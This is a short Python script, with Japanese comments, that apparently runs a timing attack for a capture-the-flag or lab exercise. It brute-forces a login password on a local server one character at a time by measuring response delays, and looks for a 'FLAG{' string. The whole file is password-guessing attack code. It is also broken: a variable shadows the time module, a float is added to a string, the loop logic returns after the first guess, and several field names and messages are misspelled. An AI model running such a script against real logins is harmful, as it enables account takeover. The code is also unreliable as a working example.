import requests
import time
import string
import statistics

TARGET_URL="http://127.0.0.1:8080"
USERNAME="adimin"
ALPHABET= string.ascii_lowercase + string.digits
SAMPLES_PER_GUESS = 5 #各候補を何回測るか
DELAY_THRESHOLD = 0.03 #30ms (環境に合わせて)

def measure_time(password):
    time = []
    for _ in range(SAMPLES_PER_GUESS):
        start = time.perf_counter()
        requests.post(
            TARGET_URL,
            data={"username": USERNAME, "password": password},
            timeout=3
        )
        time.append(time.perf_counter() - start)
    return statistics.mean(time)

def timing_attack(max_len=12):
    guessed =  ""
    for pos in range(max_len):
        best_char = None
        best_time = 0.0
        
        for ch in ALPHABET:
            test_pw = guessed + ch
            t = measure_time(test_pw)
            
            print(f"[pos {pos}] try '{test_pw}' -> {t:.4f}s")
            
            if t > best_time + DELAY_THRESHOLD:
                best_time = t
                best_char = ch
                
            if best_char is None:
                print("[!] No progress, stopping")
                break
            
            guessed += best_time
            print(f"[+] Progremss, stopping")
            
            #成功テェック
            r = requests.post(
                TARGET_URL,
                data={"usename": USERNAME, "password": guessed},
                timeout=3
            )
            if "FLAG{" in r.txt:
                print("[+] SUCCRSS!")
                print(r.text)
                return guessed
            
            return guessed
    
if __name__ == "__main__":
    result = timing_attack()
    print("[*] Result:", result)